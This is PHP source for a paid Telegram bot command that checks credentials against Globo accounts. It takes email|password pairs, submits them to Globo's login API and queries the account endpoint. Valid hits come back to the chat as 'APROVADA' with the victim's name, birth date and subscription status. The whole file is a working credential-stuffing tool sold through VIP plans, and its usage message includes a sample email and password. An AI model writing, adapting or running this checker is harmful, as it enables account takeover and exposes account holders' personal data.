<?php 

error_reporting(0);
set_time_limit(0);

date_default_timezone_set('America/Recife');
$dt_atual = date("Y/m/d H:i:s");
$timestamp_dt_atual = strtotime($dt_atual);

$array_usuarios = file("botcon/usuarios.txt");
$total_usuarios_registrados = count($array_usuarios);

$array_grupos = file("botcon/grupos.txt");
$total_grupos_registrados = count($array_grupos);

$continuar = false;
for($i=0;$i<count($array_usuarios);$i++){
    $explode = explode("|" , $array_usuarios[$i]);
     if($user_id == $explode[0]){
         $vencimento = $explode[1];
         $continuar = true;
     }
}

$timestamp_dt_expira = strtotime($vencimento);

if(!$continuar){
$continuar2 = false;
for($i=0;$i<count($array_grupos);$i++){
    $grupo_vip = explode("|" , $array_grupos[$i]);
     if($chat_id == "-$grupo_vip[0]"){
         $vencimento2 = $grupo_vip[1];
         $continuar2 = true;
     }
}

$timestamp_dt_expira2 = strtotime($vencimento2);
}

if(!$continuar && !$continuar2){
    apiRequest("sendMessage", array('chat_id' => $chat_id, "parse_mode" => "Markdown", "text" => "*Você não tem permissão para utilizar esse comando! Para se tornar um usuário VIP e ter acesso as consultas e os checkers, entre em contato com o meu desenvolvedor e contrate um plano.*", "reply_to_message_id" => $message_id,
'reply_markup' => array('inline_keyboard' => array(                                                                                                                                                    
                                                      //linha 1
                                                     array(
                                                         array('text'=>'💎 PLANOS 💎',"callback_data"=>'queroservip')//botão com callback                                                                    
                                                      )
                                                          
                                            )
                                    ))); 
                                    
} else if($timestamp_dt_atual < $timestamp_dt_expira || $timestamp_dt_atual < $timestamp_dt_expira2){ 

if(strpos($comando,"@") && strpos($comando,"|")){

include 'Curl.php';
	
function formatData($data): string
{
    $data = explode('T', $data)[0];
    $data = explode('-', $data);
    $data = array_reverse($data);
    $data = implode('/', $data);
    return $data;
}

$resp = new Curl();

$line = $comando;
$separar = $resp -> multiexplode($line);
$email = $separar[0];
$pwd = $separar[1];

$resp->deleteCookies();
$resp -> url = 'https://login.globo.com/api/authentication' ;

$resp->headers = array(
    'Host: login.globo.com', 
    'accept: application/json', 
    'origin: https://login.globo.com', 
    'user-agent: Mozilla/5.0 (Linux; Android 7.1.1; SAMSUNG-SM-J320A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36',
    'content-type: application/json; charset=UTF-8', 
    'https://login.globo.com/login/6833/connect-confirm?url=https%3A%2F%2Fid.globo.com%2Fauth%2Frealms%2Fglobo.com%2Flogin-actions%2Fauthenticate%3Fsession_code%3DEi-XERkeVcDX3stM4_2B9orUAl5A_-o6JfAGIOXYytk%26execution%3D1c219005-5ee2-474e-841b-8439de30d406%26client_id%3Dtelecinev2%2540apps.globoid%26tab_id%3DliV1v1eq-Q0&error='
);

$resp ->method = 'POST';
$resp ->post = '{"payload":{"email":"'.$email.'","password":"'.$pwd.'","serviceId":6833},"captcha":""}';
$resp ->Request();
$json = json_decode($resp->data, true);

if($json['id'] === 'Authenticated'){

    $resp->url = 'https://cocoon.globo.com/v2/user/logged?servico_id=6709';
    $resp->headers = array(
        'Host: cocoon.globo.com',
        'User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:73.0) Gecko/20100101 Firefox/73.0',
        'accept: application/json', 
        'Accept-Language: pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3',
        'X-Requested-With: XMLHttpRequest',
        'Origin: https://produtos.globo.com',
        'Connection: keep-alive',
        'Referer: https://produtos.globo.com/'
    );

    $resp ->method = 'POST';
    $resp ->Request();
    $dados = json_decode($resp->data, true);    
    
    $status = $dados['status'];

    if($status == 'authorized'){
        $status = 'Sim';
        $nome = $dados['name'];
        $dt_nasc = formatData($dados['dateOfBirth']);
        
        apiRequest("sendMessage", array('chat_id' => $chat_id, 'text' => "✅ #APROVADA ⇨ $email|$pwd | Nome: $nome | Data de Nasc: $dt_nasc | Assinante: $status | Usuário autenticado com sucesso", "reply_to_message_id" => $message_id,
        'reply_markup' => array('inline_keyboard' => array(                                                                                                                                                    
                                                      //linha 1
                                                     array(
                                                         array('text'=>'🗑  Apagar  🗑',"callback_data"=>serialize(['id'=>$user_id, 'data'=>'apagar']))                                                   
                                                      )
                                                          
                                            )
                                    )));
                        
    }else{
        $status = 'Não';
        apiRequest("sendMessage", array('chat_id' => $chat_id, 'text' => "❌ #REPROVADA ⇨ $email|$pwd | Assinante: $status", "reply_to_message_id" => $message_id,
        'reply_markup' => array('inline_keyboard' => array(                                                                                                                                                    
                                                      //linha 1
                                                     array(
                                                         array('text'=>'🗑  Apagar  🗑',"callback_data"=>'apagar')                                            
                                                      )
                                                          
                                            )
                                    )));
    }
    
}else{
    $msg = $json['userMessage'];
    apiRequest("sendMessage", array('chat_id' => $chat_id, 'text' => "❌ #REPROVADA ⇨ $email|$pwd | $msg", "reply_to_message_id" => $message_id,
    'reply_markup' => array('inline_keyboard' => array(                                                                                                                                                    
                                                      //linha 1
                                                     array(
                                                         array('text'=>'🗑  Apagar  🗑',"callback_data"=>'apagar')                                             
                                                      )
                                                          
                                            )
                                    )));
}}else {
	
    apiRequest("sendMessage", array('chat_id' => $chat_id, "parse_mode" => "Markdown", "text" => "⚠️ *FORMATO INVÁLIDO!* _Para utilizar o checker, você precisa digitar o respectivo comando seguido de email e senha. 

Formato:_ email|senha

`/sexyhot cassio@doyle.com.br|colorad0`", "reply_to_message_id" => $message_id,
'reply_markup' => array('inline_keyboard' => array(                                                                                                                                                    
                                                      //linha 1
                                                     array(
                                                         array('text'=>'🗑  Apagar  🗑',"callback_data"=>'apagar')                                             
                                                      )
                                                          
                                            )
                                    )));
}} else {
	
	apiRequest("sendMessage", array('chat_id' => $chat_id, "text" => "O seu plano venceu! Por favor, entre em contato com o meu desenvolvedor e renove o seu plano para continuar utilizando todas as consultas.", "reply_to_message_id" => $message_id,
'reply_markup' => array('inline_keyboard' => array(                                                                                                                                                    
                                                      //linha 1
                                                     array(
                                                         array('text'=>'💎 PLANOS 💎',"callback_data"=>'autorizados')//botão com callback                                                                    
                                                      )
                                                          
                                            )
                                    ))); 

}

?>